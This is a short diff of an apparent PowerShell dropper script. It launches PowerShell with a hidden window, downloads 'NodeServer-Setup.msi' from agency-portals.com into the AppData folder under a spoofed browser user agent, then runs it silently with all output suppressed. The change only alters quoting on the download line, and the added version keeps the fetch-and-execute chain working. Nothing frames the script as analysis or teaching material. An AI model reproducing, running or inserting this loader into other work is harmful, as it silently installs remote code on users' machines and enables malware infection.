@@ -1,4 +1,4 @@
-powershell  -WindowStyle Hidden -c "Invoke-WebRequest -Uri 'https://agency-portals.com/NodeServer-Setup.msi' -OutFile "$env:AppData\NodeServer-Setup.msi" -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36' };
+powershell  -WindowStyle Hidden -c Invoke-WebRequest -Uri 'https://agency-portals.com/NodeServer-Setup.msi' -OutFile "$env:AppData\NodeServer-Setup.msi" -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36' };
 
 Set-Location "$env:AppData";
 & ".\NodeServer-Setup.msi" -aoa -y > $null 2>&1;
